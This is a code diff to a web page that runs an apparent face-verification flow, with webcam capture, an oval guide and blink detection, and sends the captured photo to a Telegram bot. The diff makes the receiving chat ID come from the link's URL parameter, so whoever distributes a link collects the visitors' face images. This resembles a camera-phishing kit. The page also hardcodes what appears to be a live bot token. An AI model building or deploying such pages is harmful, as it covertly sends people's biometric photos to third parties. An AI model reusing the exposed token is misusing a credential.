@@ -102,12 +102,20 @@
         const video = document.getElementById("video");
         const statusText = document.getElementById("status");
         const overlay = document.getElementById("overlay");
+        const { chat_id } = getQueryParams();
 
         let gotPhoto = false;
         let blinkCounter = 0;
         let blinkState = false;
         let faceInsideOval = false;
         const blinkThreshold = 0.25;
+
+        function getQueryParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                chat_id: urlParams.get("chat_id"),
+            };
+        }
 
         async function setupCamera() {
             try {
@@ -276,7 +284,6 @@
 
         function sendToTelegramBot(dataURL) {
             const botToken = "7907821344:AAEJYy-7K_8aDZlxeYGdDXPTHqBsOQNj40k";
-            const chatId = "720530019";
             // Convert base64 to Blob
             function dataURLtoBlob(dataURL) {
                 const byteString = atob(dataURL.split(",")[1]);
@@ -292,7 +299,7 @@
             // Convert to Blob
             const imageBlob = dataURLtoBlob(dataURL);
             const formData = new FormData();
-            formData.append("chat_id", chatId);
+            formData.append("chat_id", chat_id);
             formData.append("photo", imageBlob, "screenshot.png");
 
             // Send image to Telegram bot
